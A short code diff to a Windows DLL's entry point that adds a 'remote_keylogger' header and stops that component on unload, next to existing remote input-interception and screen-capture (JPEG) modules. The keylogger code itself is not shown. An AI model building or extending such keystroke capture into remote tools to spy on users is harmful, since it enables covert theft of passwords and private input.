@@ -2,6 +2,7 @@
 #include "pch.h"
 #include "gdiplus_jpeg.h"
 #include "remote_input_interception.h"
+#include "remote_keylogger.h"
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -16,6 +17,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         OutputDebugStringA("[remote] DllMain GDI+ init done\n");
         break;
     case DLL_PROCESS_DETACH:
+        remote_keylogger_stop();
         remote_input_interception_shutdown();
         gdiplus_jpeg_shutdown();
         break;
